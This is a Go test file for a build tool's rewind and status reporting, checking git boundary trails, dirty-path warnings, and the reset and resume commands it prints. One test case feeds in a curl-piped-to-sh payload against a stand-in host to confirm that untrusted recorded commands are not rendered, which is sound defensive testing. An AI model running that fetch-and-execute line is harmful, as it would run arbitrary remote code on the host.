package buildstore

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"kbase/internal/buildstore/storetest"
	"kbase/internal/kb"
	"kbase/internal/result"
)

// boundary records a stage's boundary, writing a file under kb-root/ so the
// boundary commits one, and returns the commit.
func (f fixture) boundary(t *testing.T, stage string) string {
	t.Helper()
	return f.boundaryWithBody(t, stage, "")
}

// boundaryWithBody is boundary with the commit's body as given.
func (f fixture) boundaryWithBody(t *testing.T, stage, body string) string {
	t.Helper()
	s, ok := ResolveStage(stage)
	if !ok {
		t.Fatalf("%q names no stage", stage)
	}
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, s.ID+".md"), "# "+s.Display+"\n")
	commit, err := f.ledger(t).Record(s.ID, s.Display, body)
	if err != nil {
		t.Fatal(err)
	}
	return commit
}

// recordRun writes the progress record of one build that opened with argv and
// ended so, as a build leaves it in the state store.
func (f fixture) recordRun(t *testing.T, ended string, argv []string) {
	t.Helper()
	f.recordInvocation(t, argv, Event{Event: EventEnd, Outcome: ended})
}

func (f fixture) rewind(t *testing.T, target string) (string, []result.Field) {
	t.Helper()
	return Rewind(RewindOptions{RepoRoot: f.repo, StateDir: f.state, Target: target})
}

// recordInvocation writes one invocation the store does not hold yet: its run
// event carrying argv, then events, as a build leaves them in the progress
// record.
func (f fixture) recordInvocation(t *testing.T, argv []string, events ...Event) {
	t.Helper()
	appendProgress(t, f.state, append([]Event{{Event: EventRun, PID: os.Getpid(), Resume: argv}}, events...)...)
}

// reset moves the branch to commit and brings the owned paths with it: what a
// `git reset --hard <commit>` leaves a rewind reading, without starting a
// process.
func (f fixture) reset(t *testing.T, commit string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(f.repo, ".git", "refs", "heads", "main"), []byte(commit+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := f.ledger(t).Restore(commit); err != nil {
		t.Fatal(err)
	}
}

// trailLines is the boundaries field as "stage commit subject" lines, in
// document order.
func trailLines(fields []result.Field) []string {
	boundaries, _ := storetest.Field(fields, "boundaries").([]result.Record)
	lines := make([]string, len(boundaries))
	for i, r := range boundaries {
		lines[i] = fmt.Sprint(r[0].Value, " ", r[1].Value, " ", r[2].Value)
	}
	return lines
}

// recordValue is a record's value under key.
func recordValue(r result.Record, key string) any {
	for _, f := range r {
		if f.Key == key {
			return f.Value
		}
	}
	return nil
}

// TestRewindReportsTheTrail: the document names the commit HEAD stands at and
// every boundary the trail holds, oldest first, each with its subject; with no
// target its commands carry the reset line unresolved.
func TestRewindReportsTheTrail(t *testing.T) {
	f := newTrailFixture(t)
	start := f.boundary(t, "start")
	graph := f.boundary(t, "document-graph")
	seed := f.boundary(t, "spine-seed")
	outcome, fields := f.rewind(t, "")
	if outcome != result.Done {
		t.Fatalf("rewind = %s %v", outcome, fields)
	}
	if got, want := storetest.Field(fields, "head"), seed; got != want {
		t.Errorf("head = %v, want the newest boundary %v", got, want)
	}
	want := []string{
		"start " + start + " kb-build: start | build started",
		"document-graph " + graph + " kb-build: document-graph | document tree derived",
		"spine-seed " + seed + " kb-build: spine-seed | claim-graph spine seeded",
	}
	if got := trailLines(fields); !slices.Equal(got, want) {
		t.Errorf("boundaries = %q, want %q", got, want)
	}
	if got := storetest.Field(fields, "dirty"); got != false {
		t.Errorf("dirty = %v, want false on a clean worktree", got)
	}
	if got, want := storetest.Field(fields, "commands").([]string), []string{"git reset --hard <sha>"}; !slices.Equal(got, want) {
		t.Errorf("commands = %q, want %q", got, want)
	}
	var doc bytes.Buffer
	if err := result.Emit(&doc, outcome, fields...); err != nil {
		t.Fatal(err)
	}
	t.Logf("three boundaries, no target:\n%s", doc.String())
}

// TestRewindTargetsABoundary: a target resolved as --through resolves it names
// the boundary's commit, the commands that reset to it and continue the build,
// and the boundaries a reset would discard.
func TestRewindTargetsABoundary(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	graph := f.boundary(t, "document-graph")
	f.boundary(t, "spine-seed")
	f.boundary(t, "claims-declared")
	argv := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", f.state}
	f.recordRun(t, result.Done, argv)
	outcome, fields := f.rewind(t, "document tree derived")
	if outcome != result.Done {
		t.Fatalf("rewind = %s %v", outcome, fields)
	}
	target, ok := storetest.Field(fields, "target").(result.Record)
	if !ok {
		t.Fatalf("no target record: %v", fields)
	}
	if got, want := recordValue(target, "stage"), "document-graph"; got != want {
		t.Errorf("target stage = %v, want %v", got, want)
	}
	if got, want := recordValue(target, "commit"), graph; got != want {
		t.Errorf("target commit = %v, want %v", got, want)
	}
	if got, want := recordValue(target, "discards"), 2; got != want {
		t.Errorf("discards = %v, want %v: two boundaries are newer than the target", got, want)
	}
	if keys, want := storetest.FieldKeys([]result.Field(target)), []string{"stage", "commit", "discards"}; !slices.Equal(keys, want) {
		t.Errorf("target keys = %q, want %q: commands sit at the top level", keys, want)
	}
	want := []string{"git reset --hard " + graph, ShellJoin(argv)}
	if got := storetest.Field(fields, "commands").([]string); !slices.Equal(got, want) {
		t.Errorf("commands = %q, want %q", got, want)
	}
	if keys, want := storetest.FieldKeys(fields), []string{"kb-root", "state-dir", "head", "boundaries", "started-at", "dirty", "commands", "target"}; !slices.Equal(keys, want) {
		t.Errorf("fields = %q, want %q in that order", keys, want)
	}
	if storetest.Carries(fields, "resume-note") {
		t.Errorf("a finished run needed no note: %v", storetest.Field(fields, "resume-note"))
	}
	var doc bytes.Buffer
	if err := result.Emit(&doc, outcome, fields...); err != nil {
		t.Fatal(err)
	}
	t.Logf("four boundaries, target document tree derived:\n%s", doc.String())
}

// TestRewindDirtyIsAWarning: the document names what the reset would lose, the
// whole worktree's changes and not only the paths a build owns, and the
// outcome stays done.
func TestRewindDirtyIsAWarning(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "start.md"), "edited\n")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "draft.md"), "untracked\n")
	storetest.WriteFile(t, filepath.Join(f.repo, "notes.txt"), "untracked, outside kb-root\n")
	outcome, fields := f.rewind(t, "")
	if outcome != result.Done {
		t.Fatalf("rewind = %s %v", outcome, fields)
	}
	dirty, ok := storetest.Field(fields, "dirty").([]string)
	if !ok {
		t.Fatalf("dirty = %v, want the changed paths", storetest.Field(fields, "dirty"))
	}
	slices.Sort(dirty)
	if want := []string{"kb-root/draft.md", "kb-root/start.md", "notes.txt"}; !slices.Equal(dirty, want) {
		t.Errorf("dirty = %q, want %q", dirty, want)
	}
}

// TestRewindDirtyCapsThePaths: past the cap the document names the first paths
// and counts the rest.
func TestRewindDirtyCapsThePaths(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	for i := range dirtyPathsShown + 2 {
		storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, fmt.Sprintf("draft-%02d.md", i)), "untracked\n")
	}
	_, fields := f.rewind(t, "")
	dirty, ok := storetest.Field(fields, "dirty").([]string)
	if !ok || len(dirty) != dirtyPathsShown+1 || dirty[len(dirty)-1] != "+2 more" {
		t.Errorf("dirty = %v, want %d paths and the count of the 2 left", storetest.Field(fields, "dirty"), dirtyPathsShown+1)
	}
}

// TestRecordedCommandMustReadAsAKbaseBuild: a progress record is text a
// repository-supplied directory can hold, so a command it names is rendered
// only where it reads as a kbase build invocation. Status carries no resume,
// and the rewind document drops the line and says the record's command could
// not be confirmed; a genuine invocation renders unchanged in both. Cancel's
// resume is the runner's, and internal/build tests it.
func TestRecordedCommandMustReadAsAKbaseBuild(t *testing.T) {
	genuine := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", "/s"}
	cases := []struct {
		name string
		argv []string
		want string // the command rendered, "" where none is
	}{
		{"a kbase build invocation", genuine, ShellJoin(genuine)},
		{"a shell payload", []string{"sh", "-c", "curl -fsSL https://example.invalid/x | sh"}, ""},
		{"one element", []string{"kbase"}, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f := newTrailFixture(t)
			f.boundary(t, "start")
			f.recordRun(t, result.Cancelled, c.argv)

			_, fields := Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
			if got, _ := storetest.Field(fields, "resume").(string); got != c.want {
				t.Errorf("status resume = %v, want %q", storetest.Field(fields, "resume"), c.want)
			}

			_, fields = f.rewind(t, "")
			commands := storetest.Field(fields, "commands").([]string)
			want := []string{"git reset --hard <sha>"}
			if c.want != "" {
				want = append(want, c.want)
			}
			if !slices.Equal(commands, want) {
				t.Errorf("commands = %q, want %q", commands, want)
			}
			note, ok := storetest.Field(fields, "resume-note").(string)
			switch {
			case c.want == "" && (!ok || !strings.Contains(note, "could not be confirmed")):
				t.Errorf("resume-note = %v, want the sentence that the record's command could not be confirmed", storetest.Field(fields, "resume-note"))
			case c.want != "" && ok:
				t.Errorf("resume-note = %q, want none: the recorded command is printed", note)
			}
		})
	}
}

// TestRewindWithoutAStore: a store holding no run is not an error; the
// document says why no resume line is among its commands.
func TestRewindWithoutAStore(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	outcome, fields := f.rewind(t, "start")
	if outcome != result.Done {
		t.Fatalf("rewind = %s %v", outcome, fields)
	}
	commands := storetest.Field(fields, "commands").([]string)
	if len(commands) != 1 {
		t.Errorf("commands = %q, want the reset line alone", commands)
	}
	note, ok := storetest.Field(fields, "resume-note").(string)
	if !ok || !strings.Contains(note, f.state) {
		t.Errorf("resume-note = %v, want the reason no resume line is printed, naming %s", storetest.Field(fields, "resume-note"), f.state)
	}
}

// TestTheRunReportedIsTheOneThatRecorded: a refusal a stage's row raised after
// a boundary was recorded is the run the build stands at — status reports it,
// with the command that continues it, and the trail document prints that
// command. A refusal that recorded nothing wrote nothing, so the run before it
// stands and both documents report that one.
func TestTheRunReportedIsTheOneThatRecorded(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	argv := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", f.state}

	f.recordInvocation(t, argv, Event{Event: EventStage, Stage: StageStart, Total: 1},
		Event{Event: EventEnd, Outcome: result.Refused})
	_, fields := Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
	if got := storetest.Field(fields, "state"); got != StateNone {
		t.Errorf("status after a refusal that recorded nothing = %v, want %s", got, StateNone)
	}
	if got := storetest.Field(fields, "resume"); got != nil {
		t.Errorf("status resume = %v, want none: the refusal recorded nothing to continue", got)
	}
	_, fields = f.rewind(t, "")
	if got, want := storetest.Field(fields, "commands").([]string), []string{"git reset --hard <sha>"}; !slices.Equal(got, want) {
		t.Errorf("commands = %q, want the reset line alone, %q", got, want)
	}

	f.recordInvocation(t, argv, Event{Event: EventStage, Stage: StageStart, Total: 1},
		Event{Event: EventRecorded, Stage: StageStart},
		Event{Event: EventStage, Stage: StageDocumentGraph, Total: 2},
		Event{Event: EventEnd, Outcome: result.Refused})
	_, fields = Status(MonitorOptions{StateDir: f.state, WorkDir: f.repo})
	if got := storetest.Field(fields, "state"); got != StateFailed {
		t.Errorf("status after a refusal that recorded start = %v, want %s", got, StateFailed)
	}
	if got, want := storetest.Field(fields, "resume"), ShellJoin(argv); got != want {
		t.Errorf("status resume = %v, want %q: an identical re-issue continues it", got, want)
	}
	_, fields = f.rewind(t, "")
	if got, want := storetest.Field(fields, "commands").([]string), []string{"git reset --hard <sha>", ShellJoin(argv)}; !slices.Equal(got, want) {
		t.Errorf("commands = %q, want %q", got, want)
	}
}

// TestRewindPrintsABoundedRunsCommand: status suppresses a bounded run's resume
// command and the document prints it, saying why the two differ.
func TestRewindPrintsABoundedRunsCommand(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	f.boundary(t, "document-graph")
	argv := []string{"kbase", "build", "/papers/paper.tex", "--state-dir", f.state}
	f.recordRun(t, result.Bounded, argv)
	_, fields := f.rewind(t, "")
	commands := storetest.Field(fields, "commands").([]string)
	if len(commands) != 2 || commands[1] != ShellJoin(argv) {
		t.Errorf("commands = %q, want the reset line and the recorded command %q", commands, ShellJoin(argv))
	}
	note, ok := storetest.Field(fields, "resume-note").(string)
	if !ok || !strings.Contains(note, "bounded") {
		t.Errorf("resume-note = %v, want the sentence saying a bounded run's command is printed here", storetest.Field(fields, "resume-note"))
	}
}

// TestRewindRefusesATargetWithNoBoundary: a target that names no stage, and one
// naming a stage the trail does not record, are this tool's own usage refusal,
// the boundary ids the closed set it comes from.
func TestRewindRefusesATargetWithNoBoundary(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	f.boundary(t, "document-graph")
	for _, target := range []string{"nonsense", "spine-seed"} {
		t.Run(target, func(t *testing.T) {
			outcome, fields := f.rewind(t, target)
			if outcome != result.Refused {
				t.Fatalf("rewind to %q = %s %v, want refused", target, outcome, fields)
			}
			items, _ := storetest.Field(fields, "refusals").([]result.Item)
			if len(items) != 1 || items[0].Check != CheckUsage || items[0].Key != "target" {
				t.Fatalf("refusals = %+v, want one usage item naming target", items)
			}
			if want := []string{"start", "document-graph"}; !slices.Equal(items[0].Allowed, want) {
				t.Errorf("allowed = %q, want the boundary ids %q", items[0].Allowed, want)
			}
		})
	}
}

// TestRewindWithoutStartedAt: a trail whose start boundary records no
// started-at names it null, and started-at is no target.
func TestRewindWithoutStartedAt(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	outcome, fields := f.rewind(t, "")
	if outcome != result.Done || !storetest.Carries(fields, "started-at") || storetest.Field(fields, "started-at") != nil {
		t.Fatalf("rewind = %s %v, want started-at present and null", outcome, fields)
	}
	outcome, fields = f.rewind(t, "started-at")
	items, _ := storetest.Field(fields, "refusals").([]result.Item)
	if outcome != result.Refused || len(items) != 1 || items[0].Key != "target" || slices.Contains(items[0].Allowed, "started-at") {
		t.Errorf("rewind to started-at = %s %+v, want refused with started-at not allowed", outcome, items)
	}
}

// TestRewindTargetsStartedAt: a start boundary recording started-at names the
// clean state before the build; targeting it resets there alone, discarding
// every boundary, and says a build after it is fresh.
func TestRewindTargetsStartedAt(t *testing.T) {
	f := newTrailFixture(t)
	before, err := f.ledger(t).Commit("before the build", "")
	if err != nil {
		t.Fatal(err)
	}
	f.boundaryWithBody(t, "start", Inputs{VolumeRoots: []string{"/papers/paper.tex"}}.Body(before))
	f.boundary(t, "document-graph")
	f.recordRun(t, result.Bounded, []string{"kbase", "build", "--resume", "--state-dir", f.state})

	outcome, fields := f.rewind(t, "")
	started, _ := storetest.Field(fields, "started-at").(result.Record)
	if outcome != result.Done || recordValue(started, "commit") != before || recordValue(started, "label") == nil {
		t.Fatalf("rewind = %s %v, want started-at naming %s with a label", outcome, fields, before)
	}

	outcome, fields = f.rewind(t, "started-at")
	if outcome != result.Done {
		t.Fatalf("rewind to started-at = %s %v", outcome, fields)
	}
	if got, want := storetest.Field(fields, "commands").([]string), []string{"git reset --hard " + before}; !slices.Equal(got, want) {
		t.Errorf("commands = %q, want the reset line alone, %q", got, want)
	}
	target, _ := storetest.Field(fields, "target").(result.Record)
	if got := recordValue(target, "discards"); got != 2 {
		t.Errorf("discards = %v, want every boundary, 2", got)
	}
	if note, _ := storetest.Field(fields, "resume-note").(string); !strings.Contains(note, "fresh") {
		t.Errorf("resume-note = %q, want the sentence that a build after the reset is fresh", note)
	}

	_, fields = f.rewind(t, "nonsense")
	items, _ := storetest.Field(fields, "refusals").([]result.Item)
	if len(items) != 1 || !slices.Equal(items[0].Allowed, []string{"start", "document-graph", "started-at"}) {
		t.Errorf("refusals = %+v, want started-at allowed after the boundary ids", items)
	}
}

// TestRewindRefusesAnOutOfOrderTrail: a trail recording a stage over an
// unrecorded earlier one carries build's own trail refusal, and the document
// still lists the boundaries the trail holds.
func TestRewindRefusesAnOutOfOrderTrail(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	f.boundary(t, "claims-declared")
	trail, err := f.ledger(t).Trail()
	if err != nil {
		t.Fatal(err)
	}
	want := TrailRefusal(f.repo, RecordedStages(trail))
	if len(want) == 0 {
		t.Fatal("the fixture records no out-of-order trail")
	}
	outcome, fields := f.rewind(t, "")
	if outcome != result.Refused {
		t.Fatalf("rewind = %s %v, want refused", outcome, fields)
	}
	items, _ := storetest.Field(fields, "refusals").([]result.Item)
	if len(items) != 1 || items[0].Check != want[0].Check || items[0].Detail != want[0].Detail {
		t.Errorf("refusals = %+v, want %+v", items, want)
	}
	if got := len(trailLines(fields)); got != 2 {
		t.Errorf("%d boundaries listed, want the trail's 2", got)
	}
}

// TestRewindOutsideAWorktree: a directory outside any git worktree is refused
// as status refuses it, naming git init.
func TestRewindOutsideAWorktree(t *testing.T) {
	base := t.TempDir()
	storetest.GitEnv(t, base)
	outcome, fields := Rewind(RewindOptions{RepoRoot: base, StateDir: filepath.Join(base, "state")})
	if outcome != result.Refused {
		t.Fatalf("rewind outside a worktree = %s %v, want refused", outcome, fields)
	}
	items, _ := storetest.Field(fields, "refusals").([]result.Item)
	if len(items) != 1 || items[0].Check != CheckWorktree || items[0].Remedy != "git init" {
		t.Errorf("refusals = %+v, want one worktree item with the git init remedy", items)
	}
}

// TestRewindListsABoundaryOutsideTheVocabulary: a `kb-build:` subject naming no
// stage is a boundary the document lists and the trail refusal says nothing of
// — it reads a gap in walk order, and an id outside the vocabulary is no gap.
func TestRewindListsABoundaryOutsideTheVocabulary(t *testing.T) {
	f := newTrailFixture(t)
	f.boundary(t, "start")
	storetest.WriteFile(t, filepath.Join(f.repo, kb.KBDir, "mystery.md"), "# mystery\n")
	if _, err := f.ledger(t).Record("mystery", "a stage this kbase does not know", ""); err != nil {
		t.Fatal(err)
	}
	outcome, fields := f.rewind(t, "")
	if outcome != result.Done {
		t.Fatalf("rewind = %s %v, want the trail read", outcome, fields)
	}
	lines := trailLines(fields)
	if len(lines) != 2 || !strings.HasPrefix(lines[1], "mystery ") {
		t.Errorf("boundaries = %q, want both, the unknown stage's among them", lines)
	}
}

// TestRewindAfterAResetToAMidTrailBoundary: the newer boundaries are gone from
// the trail a reset leaves, and the document reads that trail.
func TestRewindAfterAResetToAMidTrailBoundary(t *testing.T) {
	f := newTrailFixture(t)
	start := f.boundary(t, "start")
	graph := f.boundary(t, "document-graph")
	f.boundary(t, "spine-seed")
	if _, fields := f.rewind(t, ""); len(trailLines(fields)) != 3 {
		t.Fatalf("%d boundaries before the reset, want 3", len(trailLines(fields)))
	}
	f.reset(t, graph)
	outcome, fields := f.rewind(t, "")
	if outcome != result.Done {
		t.Fatalf("rewind = %s %v", outcome, fields)
	}
	want := []string{
		"start " + start + " kb-build: start | build started",
		"document-graph " + graph + " kb-build: document-graph | document tree derived",
	}
	if got := trailLines(fields); !slices.Equal(got, want) {
		t.Errorf("boundaries after the reset = %q, want %q", got, want)
	}
	if got := storetest.Field(fields, "head"); got != graph {
		t.Errorf("head = %v, want the boundary reset to, %v", got, graph)
	}
	if got := storetest.Field(fields, "dirty"); got != false {
		t.Errorf("dirty = %v, want false after the reset", got)
	}
}
